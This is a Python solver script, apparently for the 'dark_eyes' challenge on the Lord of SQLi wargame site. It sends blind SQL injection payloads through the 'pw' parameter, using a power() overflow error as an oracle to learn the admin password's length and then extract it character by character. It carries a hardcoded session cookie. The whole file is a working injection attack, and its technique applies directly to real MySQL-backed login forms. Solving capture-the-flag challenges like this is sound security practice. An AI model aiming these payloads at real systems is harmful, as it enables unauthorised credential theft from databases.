import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def string_to_binary(s):
    concat = ''
    for c in s:
        val = ord(c)
        res = ''
        while val:
            res += str(int(val%2))
            val //= 2
        res += '0'*(8-len(res))
        concat += res[::-1]
    return concat
    # return ''.join(format(ord(char), '02x') for char in s)

# print(string_to_binary('^FLAG{$'))

URL = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
SESSION_ID = "tbm4o2jsok14jk1i8n7bhcov7a"
cookies = {'PHPSESSID':SESSION_ID}
params ={'pw':''}

secret = ""
length = 0

# find length
for i in range(100):
    payload = f"' || id='admin' and power((length(pw)={i})*10000,100000)--\t"
    params['pw'] = payload
    response = requests.get(URL,params=params, cookies=cookies)
    # print(payload)
    # print(response.text)
    if not response.text:
        length=i
        print(f'length of password is: {i}')
        break

# length = 100

for i in range(1,length+1):
    for c in string.digits+string.ascii_letters:
        # guess_pass = (secret+c).replace("_", r"\_")
        # binary = string_to_binary(guess_pass)
        # hex = string_to_hex(guess_pass)
        payload = f"' || id='admin' and power((substr(pw,{i},1)='{c}')*10000,100000)--\t"

        
        # print(f"{c} : {payload}")
        params['pw'] = payload
        # print(c)
        response = requests.get(URL,params=params, cookies=cookies)
        # print(response.text)
        
        if not response.text:
            i += 1      
            secret += c
            print("password: "+secret.ljust(length, '*'))
            break

print(f"final password: {secret}")
